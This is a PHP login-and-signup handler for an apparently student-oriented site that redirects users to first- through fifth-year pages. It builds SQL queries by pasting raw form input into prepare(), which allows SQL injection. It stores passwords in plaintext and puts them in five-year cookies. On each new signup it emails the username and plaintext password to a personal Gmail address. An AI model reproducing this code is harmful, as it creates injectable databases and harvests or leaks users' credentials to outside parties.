<?php
    session_start();

require 'config.php';
require_once 'mail.php';



if($data_base){
        if(isset($_POST['send1']) 
            || isset($_POST['send2'])
            || isset($_POST['send3'])
            || isset($_POST['send4'])
            || isset($_POST['send5'])){
            $username_sign=$_POST['username'];
            $password_sign=$_POST['password'];
            $year=$_POST['year'];
            $date=Date("y:m:d");
            $sql=$data_base->prepare( "SELECT * FROM users WHERE username='$username_sign' AND
            password='$password_sign'");
            $sql->execute();
            $sql=$sql->fetch(PDO::FETCH_ASSOC);
            // echo $sql->rowCount();
            if ($sql) {
                setcookie('username_cookie',$username_sign ,time()+ 60*60*24*365*5, '/');
                setcookie('password_cookie', $password_sign ,time()+ 60*60*24*365*5, '/');
                
                $_SESSION['signupdone'] = $username_sign;
                if(isset($_POST['send1'])){
                    echo "<script>window.location.href='../firstYear.php'</script>";
                }
                else if(isset($_POST['send2'])){
                    echo "<script>window.location.href='../secondYear.php'</script>";
                }
                else if(isset($_POST['send3'])){
                    echo "<script>window.location.href='../thirdYear.php'</script>";
                }
                else if(isset($_POST['send4'])){
                    echo "<script>window.location.href='../fourthYear.php'</script>";
                }
                else if(isset($_POST['send5'])){
                    echo "<script>window.location.href='../fifthYear.php'</script>";
                }
            }
            else{
                $sql_insert=$data_base->prepare("INSERT INTO users (username, password,year,date) VALUES ('$username_sign','$password_sign','$year','$date')");
                if($sql_insert->execute()==true){
                    setcookie('username_cookie',$username_sign ,time()+ 60*60*24*365*5, '/');
                    setcookie('password_cookie', $password_sign ,time()+ 60*60*24*365*5, '/');

                    $mail->setFrom('em.industry1@gmail.com', 'EM Industry');
                    $mail->addAddress('eesamousa2000@gmail.com'); 
                    $mail->Subject = $username_sign.' سجل دخول';
            
                    $mail->Body    = 'name : '.$username_sign.'<br>'
                                    .'password : '.$password_sign.'<br>'.'
                                    <br><br> year:'.$year;
                    $mail->send();

                    $_SESSION['signupdone'] = $username_sign;
                    if(isset($_POST['send1'])){
                        echo "<script>window.location.href='../firstYear.php'</script>";
                    }
                    else if(isset($_POST['send2'])){
                        echo "<script>window.location.href='../secondYear.php'</script>";
                    }
                    else if(isset($_POST['send3'])){
                        echo "<script>window.location.href='../thirdYear.php'</script>";
                    }
                    else if(isset($_POST['send4'])){
                        echo "<script>window.location.href='../fourthYear.php'</script>";
                    }
                    else if(isset($_POST['send5'])){
                        echo "<script>window.location.href='../fifthYear.php'</script>";
                    }
                }
            }
        
        }
    }
    require "waiting.php";
        ?>